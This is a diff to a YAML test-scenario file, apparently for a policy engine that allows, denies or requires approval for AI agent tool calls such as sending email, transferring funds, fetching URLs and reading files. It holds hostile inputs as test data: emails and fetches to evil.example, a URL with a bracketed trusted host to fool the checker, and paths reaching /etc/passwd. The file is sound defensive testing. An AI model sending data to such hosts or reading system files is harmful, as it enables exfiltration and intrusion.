@@ -8,6 +8,7 @@ scenarios:
         subject: Status
         body: The deploy is complete.
     expected: require_approval
+    rule: approve_irreversible
 
   - id: external-email
     description: Email to an external domain is denied.
@@ -18,6 +19,7 @@ scenarios:
         subject: Status
         body: The deploy is complete.
     expected: deny
+    rule: deny_external_email
 
   - id: allowed-recipient-list
     description: A list of internal recipients is not denied by the external-email rule.
@@ -28,6 +30,7 @@ scenarios:
         subject: Status
         body: The deploy is complete.
     expected: require_approval
+    rule: approve_irreversible
 
   - id: mixed-recipient-list
     description: One external address in a recipient list denies the whole send.
@@ -38,6 +41,7 @@ scenarios:
         subject: Status
         body: The deploy is complete.
     expected: deny
+    rule: deny_external_email
 
   - id: display-name-external
     description: A display name does not hide an external address.
@@ -48,6 +52,18 @@ scenarios:
         subject: Status
         body: The deploy is complete.
     expected: deny
+    rule: deny_external_email
+
+  - id: display-name-mixed-list
+    description: A display name does not hide a second, unbracketed external address.
+    action:
+      tool: send_email
+      args:
+        to: Alice <alice@example.com>, attacker@evil.example
+        subject: Status
+        body: The deploy is complete.
+    expected: deny
+    rule: deny_external_email
 
   - id: small-transfer
     description: A transfer below the amount threshold still needs approval because it is irreversible.
@@ -57,15 +73,17 @@ scenarios:
         amount: 250
         to: treasury
     expected: require_approval
+    rule: approve_irreversible
 
   - id: large-transfer
-    description: A transfer above the amount threshold requires approval.
+    description: A transfer above the amount threshold requires approval by the threshold rule.
     action:
       tool: transfer_funds
       args:
         amount: 5000
         to: treasury
     expected: require_approval
+    rule: approve_large_transfer
 
   - id: trusted-fetch
     description: Fetching an allowlisted documentation domain is allowed.
@@ -82,6 +100,16 @@ scenarios:
       args:
         url: https://evil.example/collect
     expected: deny
+    rule: deny_untrusted_fetch
+
+  - id: bracketed-host-fetch
+    description: Bracketed text in a URL does not replace the real host.
+    action:
+      tool: fetch_url
+      args:
+        url: "https://evil.example/?q=<docs.example.com>"
+    expected: deny
+    rule: deny_untrusted_fetch
 
   - id: irreversible-small-action
     description: An irreversible transfer requires approval even when its amount is small.
@@ -92,6 +120,7 @@ scenarios:
         to: treasury
       reversible: false
     expected: require_approval
+    rule: approve_irreversible
 
   - id: path-escape
     description: A path that escapes the sandbox is denied.
@@ -100,6 +129,7 @@ scenarios:
       args:
         path: ../../etc/passwd
     expected: deny
+    rule: deny_path_escape
 
   - id: absolute-path-escape
     description: An absolute path is denied even without a traversal component.
@@ -108,6 +138,7 @@ scenarios:
       args:
         path: /etc/passwd
     expected: deny
+    rule: deny_path_escape
 
   - id: read-file-allowed
     description: A relative path inside the sandbox is allowed.
@@ -126,3 +157,4 @@ scenarios:
         subject: API key
         body: Here is the key.
     expected: deny
+    rule: deny_external_email
